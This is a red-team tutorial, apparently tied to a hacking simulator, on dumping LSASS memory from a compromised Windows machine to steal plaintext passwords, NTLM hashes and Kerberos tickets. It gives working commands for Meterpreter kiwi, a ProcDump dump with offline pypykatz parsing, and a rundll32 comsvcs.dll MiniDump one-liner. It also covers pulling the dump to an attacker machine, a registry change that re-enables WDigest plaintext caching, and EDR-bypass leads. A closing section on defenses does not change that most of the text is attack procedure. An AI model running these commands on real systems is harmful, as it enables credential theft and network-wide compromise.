# LSASS Dump — Stealing Plaintext Passwords from Memory

After you've popped a Windows box and you're SYSTEM, the next move every red
teamer makes is the same: dump LSASS. The Local Security Authority Subsystem
Service holds the cleartext passwords, NTLM hashes, and Kerberos tickets of
every user currently logged on. Crack the host once, walk into LSASS, and you
walk out with the rest of the network's credentials.

This guide covers three flavors of LSASS dump. They land at the same place
(plaintext credentials), but each has different OPSEC trade-offs.

---

## Prerequisites

- An open Meterpreter session on the target (`run` against EternalBlue gets you here).
- SYSTEM-level privileges. EternalBlue gives you these for free; on other vectors
  you'll need `getsystem` first.
- About 30–90 seconds, depending on which method you pick.

---

## Method 1: `mimikatz` via Meterpreter Kiwi (the classic)

Mimikatz has been the king of credential dumping since 2011. Metasploit ships
the `kiwi` extension — the same engine, wrapped as a Meterpreter module.

Open the explanation card for **EternalBlue → Meterpreter session opened**, fire
the exploit, and when you land in `meterpreter >`, run:

```
meterpreter > load kiwi
```

The extension takes ~1 second to upload over the existing session and
register. You'll see Benjamin Delpy's signature ASCII banner, then `Success.`

Now request all credentials in one shot:

```
meterpreter > creds_all
```

Behind the scenes, kiwi does this:

1. Calls `OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsass_pid)`.
2. Walks LSASS's heap looking for the `LogonSessionList` linked list.
3. For each entry, decrypts the credentials in place using LSASS's own
   key material (LSAEncryptMemory).
4. Streams the results back through the Meterpreter channel.

Expect the whole thing to take **~6–8 seconds** — most of it is
the credential walk, not network round-trip. The output prints in three blocks:

- **`msv`** — NTLM hashes (always populated)
- **`wdigest`** — *plaintext* passwords, if WDigest hasn't been disabled
  (default-on through Win 8.1; opt-in only since KB2871997)
- **`tspkg`** — plaintext for terminal services / RDP logons
- **`kerberos`** — plaintext for kerberos-authenticated sessions

The juicy line you're hunting for looks like this:

```
Administrator   DC01    SuperS3cret_Admin!2024
```

That's the local Administrator's password, in cleartext, lifted straight from
RAM. Game over.

### When to use it

- Fast iteration during an engagement.
- Already in Meterpreter. Why pivot to a second tool?

### When *not* to use it

- Modern AV (Defender, CrowdStrike, SentinelOne) catches mimikatz signatures
  by name — `creds_all` triggers detections even from inside Meterpreter.
- Audit logs see the kiwi DLL get reflectively loaded into the Meterpreter
  process. EDR notices.

### Bonus commands once kiwi is loaded

```
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
```

`lsa_dump_sam` reads the SAM hive directly from the registry — local users only,
but it works without LSASS access.

`lsa_dump_secrets` pulls **LSA Secrets** — service account passwords, DPAPI
master keys, the auto-logon password if anyone's been lazy. Critical loot:
service accounts cached here are often domain accounts with high privilege.

---

## Method 2: ProcDump + offline pypykatz (the OPSEC-friendly way)

Mimikatz on disk lights up every AV product on the planet. ProcDump doesn't,
because it's a **Microsoft-signed Sysinternals binary**. You use ProcDump to
write a memory dump of LSASS to disk, exfiltrate it, then parse it offline on
*your* attack box where AV doesn't get a vote.

Drop into the Windows shell from Meterpreter:

```
meterpreter > shell
Process 1337 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
(c) 2009 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Run procdump against `lsass.exe`. The first time you run it, the EULA prompt
will block you:

```
C:\> procdump.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

You'll get back:

```
You have not accepted the Sysinternals license terms.
Use the -accepteula option to accept the EULA.
```

Add `-accepteula` and retry:

```
C:\> procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

**Expect this to take 7–10 seconds.** ProcDump suspends LSASS, walks the
process's virtual address space (every committed page, several GB worth on a
busy DC), serializes it into the minidump format, then resumes the process.
The dump file lands at ~47 MB on a Windows 7 box — bigger on Server 2019+.

Important latency notes:

- The "Estimated dump file size" line appears about 2.5s in. That's procdump
  finishing its initial enumeration.
- The "Dump complete" line appears around the 7s mark. The actual page-by-page
  serialization is the slow part.
- On a real DC under load, the same operation can take 20–30s.

Now exfiltrate the dump. Drop back to Meterpreter:

```
C:\> exit
meterpreter > download C:\Windows\Temp\lsass.dmp /tmp/lsass.dmp
```

Over the EternalBlue reverse shell, expect ~3–5 seconds per MB of transfer
on a LAN — so a 47 MB dump is 2–4 minutes. On a real engagement over the
internet you'd be waiting 15+ minutes. Plan accordingly.

Once it's on your box, parse offline with **pypykatz** — the modern Python
rewrite of mimikatz that doesn't need Windows or any C compiler:

```
$ pypykatz lsa minidump /tmp/lsass.dmp
```

pypykatz takes ~2.5 seconds to parse the file (most of that is loading
the Python interpreter and importing dependencies — the actual parsing is
sub-second). Output is structured by `LogonSession`, with each session showing
MSV, WDigest, and Kerberos credentials.

Look for these lines in the output:

```
== WDIGEST [44d32]==
    username Administrator
    domainname DC01
    password SuperS3cret_Admin!2024
```

Same plaintext password as kiwi. Different path. No mimikatz on the target.

### Why this is better

- No mimikatz signatures on the target's disk.
- procdump.exe is signed by Microsoft and lives on every sysadmin's toolkit.
  Most AV products allow it by default.
- Parsing happens on your box — even if the target's EDR is scanning every
  byte, by the time the dump hits your machine it's just a binary blob.

### Why this is still detectable

- procdump.exe opening lsass.exe with `PROCESS_VM_READ` is itself a known
  EDR detection. Modern EDR (Defender ATP, CrowdStrike Falcon, etc.) flags
  ANY process opening LSASS with read access — regardless of who's doing it.
- Sysmon Event ID 10 (`ProcessAccess`) catches it cold.

---

## Method 3: `comsvcs.dll` MiniDump (the LOLBAS classic)

The cleanest version. No third-party tools at all. Windows ships a built-in
DLL that does exactly what procdump does: `comsvcs.dll`. Its `MiniDump`
function takes a PID and an output path and produces a minidump.

This is the textbook **LOLBAS** technique — Living Off the Land Binaries,
Scripts and Libraries. You're using Microsoft's own signed code to do
something Microsoft very much doesn't want you doing.

First, find the PID of `lsass.exe`:

```
C:\> tasklist | findstr lsass
lsass.exe                      460 Services                   0     11,236 K
```

Now invoke comsvcs.dll's MiniDump entry point via rundll32:

```
C:\> rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 460 C:\Windows\Temp\lsass.dmp full
```

**This command takes ~2.5 seconds and prints absolutely nothing.** That's not
a bug — comsvcs.dll's MiniDump is silent on success. The only way to know it
worked is to check that the output file exists:

```
C:\> dir C:\Windows\Temp\lsass.dmp
```

Now exfil and parse with pypykatz exactly like Method 2.

### Why operators love this

- No download required. comsvcs.dll has been on every Windows install since
  Windows 2000.
- No third-party signed binary needed. You're using rundll32 (Microsoft) to
  call a function in comsvcs (Microsoft).
- Trivial to script — fits in a one-liner.

### Why it still gets caught

- The exact same `PROCESS_VM_READ` against lsass.exe triggers EDR.
- The `MiniDump` export of `comsvcs.dll` is a well-known IOC. CrowdStrike
  flagged it years ago.
- File creation events for `lsass.dmp` (or anything matching `*lsass*`) are
  watched by every SIEM with a pulse.

### A note on PID lookups

If you're scripting this, you can grab the PID dynamically:

```
C:\> for /f "tokens=2" %i in ('tasklist ^| findstr lsass') do rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %i C:\Windows\Temp\l.dmp full
```

In a real `cmd.exe` (not a `.bat` file), use single `%`. In a batch file, use
double `%%`. In PowerShell, the syntax is completely different — use
`Get-Process lsass`.

---

## Putting it together — the realistic attack path

```
1. EternalBlue lands you a Meterpreter session on 10.10.10.10
2. getuid                                       → confirm SYSTEM (5ms)
3. load kiwi                                    → upload extension (~1s)
4. creds_all                                    → walk LSASS (~6-8s)
5. → Plaintext: SuperS3cret_Admin!2024
6. → Hash: 8c802621d2e36fc074345dded890f3e5  (svc_backup)
7. lsa_dump_secrets                             → LSA Secrets (~3s)
8. → Service account creds, DPAPI keys
9. exit (return to msfconsole)
```

Total time from `run` to plaintext domain admin: about **15 seconds of
emulator-busy time** plus whatever the network adds.

### Or, the OPSEC version:

```
1. EternalBlue → Meterpreter session
2. shell                                        → drop to cmd.exe
3. tasklist | findstr lsass                     → PID lookup (instant)
4. rundll32 ... comsvcs.dll, MiniDump 460 C:\Windows\Temp\lsass.dmp full
                                                → silent dump (~2.5s)
5. exit                                         → back to Meterpreter
6. download C:\Windows\Temp\lsass.dmp /tmp/lsass.dmp
                                                → exfil (varies by link)
7. (on attack box) pypykatz lsa minidump /tmp/lsass.dmp
                                                → parse offline (~2.5s)
```

Total time: maybe 30s on a fast LAN, several minutes over the internet. But
you never touched mimikatz on the target.

---

## Defenses (so you know what you're up against)

If you're seeing all this and wondering "wait, why isn't this patched?" —
it largely is, on modern boxes. Here's what changed:

### Credential Guard (Windows 10/11 + Server 2016+)

Microsoft's solution: run LSASS's secret-storage portion (the part holding
NTLM hashes and Kerberos tickets) inside a virtualized container that the
host OS itself can't read. Even SYSTEM can't dump it.

- Requires Hyper-V + UEFI Secure Boot + a TPM.
- Not on by default in most enterprise environments. It's improving, but
  there's a lot of legacy AD out there.

### LSA Protection (RunAsPPL)

LSASS runs as a Protected Process Light. Other processes can't even open a
handle to it without the right protection level. Bypass exists (the
`mimikatz !+` driver), but it requires kernel-level access.

### WDigest disabled by default

Since KB2871997 (2014), WDigest plaintext caching is off by default. So
you'll often see `(null)` in the wdigest column on patched boxes — but
operators set the registry key back themselves before triggering reauth:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

Then wait for an admin to log in / unlock — or trigger a reauth via
RDP, scheduled task abuse, or just rebooting the box. WDigest re-populates.

### EDR + behavioral detection

Even if all of the above is bypassed, modern EDR catches the ACT of opening
LSASS with read access, regardless of method. The detection has nothing to
do with mimikatz vs. procdump vs. comsvcs — it's looking at the
`ProcessAccess` event itself.

The cat-and-mouse continues. In 2024 the leading-edge bypasses involve:
- DLL-side-loading into a process that already has a handle to LSASS
  (e.g., MsMpEng.exe — Defender itself).
- Reading LSASS via syscalls instead of WinAPI to skip user-mode hooks.
- Cloning the LSASS process and dumping the clone (`MiniDumpWriteDump`
  with the cloned handle).

If you want to dig deeper, search for: **dumpert**, **nanodump**,
**pypykatz**, **safetykatz**, and the ongoing Vault Stealer family of malware.

---

## Try it in the lab

In the Hacklet sim, you can run all three methods end-to-end:

1. `msfconsole` → `use exploit/windows/smb/ms17_010_eternalblue`
2. `set RHOSTS 10.10.10.10` → `set LHOST 10.10.10.5` → `run`
3. **Method 1**: `load kiwi` → `creds_all`
4. **Method 2**: `shell` → `procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp`
   → `exit` → `pypykatz lsa minidump /tmp/lsass.dmp` (back in Linux)
5. **Method 3**: `shell` → `tasklist | findstr lsass`
   → `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 460 C:\Windows\Temp\lsass.dmp full`
   → `exit` → `pypykatz lsa minidump /tmp/lsass.dmp`

Each method takes a different amount of wall-clock time and produces output
in a different format. Same plaintext password at the end.

Welcome to credential access.
